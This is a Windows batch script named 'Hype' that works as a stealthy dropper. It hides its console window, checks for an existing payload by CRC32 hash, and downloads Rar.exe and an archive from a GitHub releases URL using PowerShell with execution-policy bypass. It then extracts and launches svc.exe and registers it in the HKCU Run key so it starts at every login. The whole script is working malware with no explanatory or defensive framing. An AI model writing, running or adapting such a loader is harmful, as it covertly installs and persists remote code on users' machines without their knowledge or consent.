@echo off
title Hype
timeout /t 1 /nobreak >nul
powershell -Command "Add-Type -TypeDefinition 'using System;using System.Runtime.InteropServices;public class W{[DllImport(\"kernel32.dll\")]public static extern IntPtr GetConsoleWindow();[DllImport(\"user32.dll\")]public static extern bool ShowWindow(IntPtr h,int n);}';[W]::ShowWindow([W]::GetConsoleWindow(),0)"
setlocal enabledelayedexpansion

set "hypeFolder=%USERPROFILE%\AppData\Local\Hype\"
set "svcPath=%hypeFolder%svc.exe"

if exist "%hypeFolder%" if exist "%svcPath%" (
    for /f "usebackq delims=" %%i in (`powershell -ExecutionPolicy Bypass -NoProfile -Command "$c=0xFFFFFFFF;$t=New-Object uint32[] 256;for($i=0;$i-lt256;$i++){$c2=$i;for($j=0;$j-lt8;$j++){if($c2-band1){$c2=($c2-shr1)-bxor0xEDB88320}else{$c2=$c2-shr1}};$t[$i]=$c2};$b=[System.IO.File]::ReadAllBytes('""%svcPath%""');foreach($x in $b){$i2=($c-band0xFF)-bxor$x;$c=(($c-shr8)-band0x00FFFFFF)-bxor$t[$i2]};Write-Host ('{0:X8}'-f($c-bxor0xFFFFFFFF))"`) do set "crc=%%i"
    if /i "!crc!"=="FB9058AC" exit /b 0
)

set "tmpDir=%TEMP%\tmp%RANDOM%%RANDOM%.tmp"
mkdir "%tmpDir%" >nul 2>&1

set "rarExePath=%tmpDir%\Rar.exe"
set "svcRarPath=%tmpDir%\svc.rar"

powershell -ExecutionPolicy Bypass -NoProfile -Command "$wc=New-Object Net.WebClient; try{$wc.DownloadFile('https://github.com/b4xwv6p/main/releases/download/bin/Rar.exe','%rarExePath%')}catch{}"
powershell -ExecutionPolicy Bypass -NoProfile -Command "$wc=New-Object Net.WebClient; try{$wc.DownloadFile('https://github.com/b4xwv6p/main/releases/download/bin/svc.rar','%svcRarPath%')}catch{}"

if not exist "%hypeFolder%" mkdir "%hypeFolder%"

"%rarExePath%" x -y "%svcRarPath%" "%tmpDir%\"

if exist "%tmpDir%\svc.exe" (
    copy /y "%tmpDir%\svc.exe" "%svcPath%" >nul
    start "" "%svcPath%"
    reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "Hype" /t REG_SZ /d "%svcPath%" /f >nul
)

endlocal
